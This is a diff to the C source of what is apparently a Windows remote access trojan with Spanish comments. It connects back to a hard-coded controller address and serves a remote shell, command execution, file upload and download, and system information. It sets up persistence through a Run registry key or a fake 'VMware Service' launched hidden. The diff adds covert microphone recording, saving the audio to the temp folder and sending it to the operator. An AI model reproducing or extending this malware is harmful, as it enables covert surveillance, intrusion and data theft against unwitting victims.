@@ -7,8 +7,14 @@
 #include <wchar.h>
 #include <locale.h>
 #include <shlwapi.h>
+#include <Mmsystem.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 #include "../src/base64.c"
 #include "../src/sysInfoWin.c"
+
+
+#define ALIAS "random_str"
 
 // Definiciones
 #define SOCKBUFF 2048
@@ -17,16 +23,21 @@
 // Variables Globales
 
 // Prototipos
+long get_file_size(char* filename);
+char* startRecord(SOCKET conn); 
 char *IsElevated();
 void conection();
 void ash(int conn);
 void _chdir(int conn, char *instruct);
 void strtSnd(int conn, char *instruct);
+void sendVoiceData(char *filename, SOCKET conn);
+void recordAndSave(char *filename);
 int mainLoop(int conn);
 int excndSend(int conn, char *cmd);
 int getPrstnc(int conn, char *method);
 int readNdSndFle(int conn, char *file);
 int uploadFunc(char *command, SOCKET conn);
+
 
 char *IsElevated() {
     BOOL fRet = FALSE;
@@ -47,6 +58,90 @@ char *IsElevated() {
     else if (fRet == 1)
         return "yes";
     
+}
+
+void recordAndSave(char *filename) {
+    char mci_command[SOCKBUFF];
+    char ReturnString[SOCKBUFF];
+    int mci_error;
+
+    sprintf(mci_command, "open new type waveaudio alias %s", ALIAS);
+    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
+    if (mci_error != 0) {
+        printf("\n0");
+    }  
+    
+    // set the time format
+    sprintf(mci_command, "set %s time format ms", ALIAS);    // just set time format
+    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
+
+    // start recording
+    sprintf(mci_command, "record %s notify", ALIAS);
+    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
+    
+    Sleep(11000);
+
+    //stop recording
+    sprintf(mci_command, "stop %s", ALIAS);
+    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
+
+    // save the file
+    sprintf(mci_command, "save %s %s", ALIAS, filename);
+    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
+
+    // close the device
+    sprintf(mci_command, "close %s", ALIAS);
+    mci_error = mciSendString(mci_command, ReturnString, sizeof(ReturnString), NULL);
+
+
+}
+
+long get_file_size(char* filename) {
+    struct _stat file_status;
+    if (_stat(filename, &file_status) < 0) {
+        return -1;
+    }
+    return file_status.st_size;
+}
+
+void readVoiceData(char* file, SOCKET conn) { 
+    char filename[100];
+    snprintf(filename, 100, "%s", file);
+    FILE* ptr = fopen(filename, "rb");
+    char buffer[SOCKBUFF];
+    memset(buffer, 0, SOCKBUFF);
+
+    size_t bytesRead;
+    long file_size = get_file_size(filename);
+    char file_size_str[100];
+    sprintf(file_size_str, "%ld", file_size);
+
+    //snd full size
+    send(conn, file_size_str, 100, 0);
+
+    while ((bytesRead = fread(buffer, 1, SOCKBUFF, ptr)) > 0) {
+        send(conn, buffer, SOCKBUFF, 0);
+    }
+ 
+    fclose(ptr);
+    Sleep(300);
+    send(conn, "end\0", strlen("end\0"), 0);
+}
+
+char *startRecord(SOCKET conn) {
+    char* tempdir = getenv("temp");
+    char* filename = "se2h.wv";
+    char* fullPath = malloc(strlen(tempdir) + strlen(filename) + 1);
+
+    // Construimos r1uta
+    strcpy(fullPath, tempdir); strcat(fullPath, "\\"); strcat(fullPath, filename);
+    
+    //char* filename = malloc(strlen(fullPath));
+
+    printf("Nombre del archivo temporal: %s\n", fullPath);
+    recordAndSave(fullPath);
+
+    return fullPath;
 }
 
 
@@ -96,6 +191,7 @@ void _chdir(int conn, char *instruct){
     if (strcmp(instruct, "cd") == 0){
         GetCurrentDirectory(SOCKBUFF + 1, directory);
         send(conn, directory, strlen(directory), 0);
+        Sleep(300);
         send(conn, "end\0", strlen("end\0"), 0);
         return;
     }
@@ -109,6 +205,7 @@ void _chdir(int conn, char *instruct){
     SetCurrentDirectory(directory);
     GetCurrentDirectory(SOCKBUFF + 1, newDir);
     send(conn, newDir, strlen(newDir), 0);
+
     Sleep(300);
     send(conn, "end\0", strlen("end\0"), 0);
     
@@ -159,7 +256,8 @@ int writeAndDecodeData(char *data, char *file){
     char *base = PathFindFileName(file);   
  
     FILE *fp;
-    char* DecodedData = base64_decode(data);  
+    size_t sizeChars = strlen(data);
+    char* DecodedData = base64_decode(data, sizeChars, &sizeChars);
     fp = fopen(base, "w");
     
     if (fp == NULL){ 
@@ -212,16 +310,19 @@ int uploadFunc(char *command, SOCKET conn){
             char *temp = realloc(downloadedData, downloadedSize + bytesRead);
             if (temp == NULL) {
                 // Error de memoria
+                printf("ERRORE\n");
                 free(downloadedData);
                 free(file);
                 return 1;
             }
+            
             downloadedData = temp;
             memcpy(downloadedData + downloadedSize, recvData, bytesRead);
             downloadedSize += bytesRead; 
         }
     }
- 
+    
+    printf("\n\n");
     writeAndDecodeData(downloadedData, file);
     Sleep(300);
     send(conn, "end\0", strlen("end\0"), 0);
@@ -252,7 +353,8 @@ int readNdSndFle(int conn, char *file){
     size_t bytesRead;
 
     while ((bytesRead = fread(buffer, 1, 2000, ptr) > 0)) {
-        char *base64Encoded = base64_encode(buffer, strlen(buffer));
+        size_t sizeRead = bytesRead;
+        char *base64Encoded = base64_encode(buffer, sizeRead, &sizeRead);
 
         send(conn, base64Encoded, strlen(base64Encoded), 0); 
         free(base64Encoded);  // Liberar la memoria asignada por base64_encode
@@ -287,12 +389,10 @@ int getPrstnc(int conn, char *method){
 
         } else {
             char* formed = malloc(2048 * sizeof(char));
-            printf("\n\n%s\n\n", method);
             if (strcmp(method, "low") == 0)
                 snprintf(formed, SOCKBUFF, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MService /t REG_SZ /d %s /f", lction);
             
             else if(strcmp(method, "high") == 0){
-                printf("\n%s\n", IsElevated());
 
                 if (strstr("yes", IsElevated()) != NULL)
                     snprintf(formed, SOCKBUFF, "sc create \"VMware Service\" binpath= \"%s service\" start= auto", lction);
@@ -303,8 +403,8 @@ int getPrstnc(int conn, char *method){
                 }
             }
 
-            system(formed);
-            send(conn, "exito", SOCKBUFF, 0);
+            WinExec(formed, SW_HIDE);
+            send(conn, "exito", strlen("exito"), 0);
             return 0;    
         }
     
@@ -320,36 +420,44 @@ int mainLoop(int conn){
 
         if (strcmp(instruct, "exit") == 0)
             return 0;
-    
-        else if (strcmp(instruct, "exit -y") == 0){
+
+        else if (strcmp(instruct, "exit -y") == 0) {
             exit(0);
         }
-        else if (strcmp(instruct, "shell") == 0)    
-            ash(conn); 
-        
+        else if (strcmp(instruct, "shell") == 0)
+            ash(conn);
+
         else if (strstr(instruct, "download ") != NULL)
             strtSnd(conn, instruct);
 
         else if (strstr(instruct, "exec") != NULL)
             excndSend(conn, instruct);
-            
+
         else if (strstr(instruct, "upload") != NULL)
             uploadFunc(instruct, conn);
 
-        else if (strcmp(instruct, "sysinfo") == 0){
+        else if (strcmp(instruct, "sysinfo") == 0) {
             strtAll(conn);
             send(conn, "end\0", strlen("end\0"), 0);
-        
-        } else if (strcmp(instruct, "lowpersistence") == 0){
-            getPrstnc(conn, "low");          
+
+        }
+        else if (strcmp(instruct, "lowpersistence") == 0) {
+            getPrstnc(conn, "low");
             Sleep(300);
-        
-        } else if (strcmp(instruct, "persistence") == 0){
-            getPrstnc(conn, "high");          
+
+        }
+        else if (strcmp(instruct, "persistence") == 0) {
+            getPrstnc(conn, "high");
             Sleep(300);
-        
-        } else if(strcmp(instruct, "check") == 0)
+
+        }
+        else if (strcmp(instruct, "check") == 0)
             send(conn, IsElevated(), strlen(IsElevated()), 0);
+
+        else if (strcmp(instruct, "record") == 0){
+            char *file = startRecord(conn); 
+            readVoiceData(file, conn);
+        }
         else
             continue;
     }
@@ -370,8 +478,8 @@ void conection()
     struct sockaddr_in cltAddr;
 
     cltAddr.sin_family = AF_INET;
-    cltAddr.sin_port = htons(9001); // Especifcamos puerto
-    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.48"); // Especifcamos IP
+    cltAddr.sin_port = htons(9000); // Especifcamos puerto
+    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.33"); // Especifcamos IP
 
     int targetConnStatus = connect(conn, (struct sockaddr *)&cltAddr,
                                    sizeof(cltAddr));
